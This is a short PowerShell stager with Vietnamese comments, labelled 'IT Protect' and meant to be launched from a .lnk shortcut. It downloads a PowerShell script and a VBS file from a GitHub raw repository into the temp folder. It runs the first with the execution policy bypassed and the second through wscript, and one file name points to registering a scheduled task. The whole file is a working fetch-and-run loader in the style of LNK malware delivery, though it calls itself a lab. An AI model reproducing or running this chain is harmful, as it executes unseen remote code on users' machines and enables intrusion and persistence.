# Day len GitHub (raw): Lab-Chain-Run.ps1 — can cho .lnk portable (chi can .lnk, iex iwr URL nay).
# Chay tu Lab-Register-Task.lnk — console luon hien, co log.
# Tai tu GitHub raw roi chay tuan tu.

$ErrorActionPreference = 'Continue'
Write-Host ''
Write-Host '=== IT Protect (bangwonie/lnk) ===' -ForegroundColor Cyan

$p1 = Join-Path $env:TEMP 'Lab-Register-Task.ps1'
$p2 = Join-Path $env:TEMP 'Step2-Notify.vbs'
$u1 = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main/Lab-Register-Task.ps1'
$u2 = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main/Step2-Notify.vbs'

try {
    Write-Host '[1/4] Tai ps1 ->' $p1
    Invoke-WebRequest -UseBasicParsing -Uri $u1 -OutFile $p1
    if (-not (Test-Path -LiteralPath $p1)) { throw "Khong ghi duoc: $p1" }
    Write-Host ('      OK ({0} byte)' -f (Get-Item -LiteralPath $p1).Length)

    Write-Host '[2/4] Chay Lab-Register-Task.ps1 ...'
    $pwsh = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    & $pwsh -NoProfile -ExecutionPolicy Bypass -File $p1
    Write-Host ('      Exit code: {0}' -f $LASTEXITCODE)

    Write-Host '[3/4] Tai vbs ->' $p2
    Invoke-WebRequest -UseBasicParsing -Uri $u2 -OutFile $p2
    Write-Host ('      OK ({0} byte)' -f (Get-Item -LiteralPath $p2).Length)

    Write-Host '[4/4] Chay wscript Step2-Notify.vbs ...'
    $ws = Join-Path $env:SystemRoot 'System32\wscript.exe'
    Start-Process -FilePath $ws -ArgumentList $p2 -Wait
    Write-Host '      Xong.'
}
catch {
    Write-Host ('LOI: {0}' -f $_) -ForegroundColor Red
    if ($_.ScriptStackTrace) { Write-Host $_.ScriptStackTrace -ForegroundColor DarkRed }
}

Write-Host ''
Read-Host 'Nhan Enter de dong cua so'
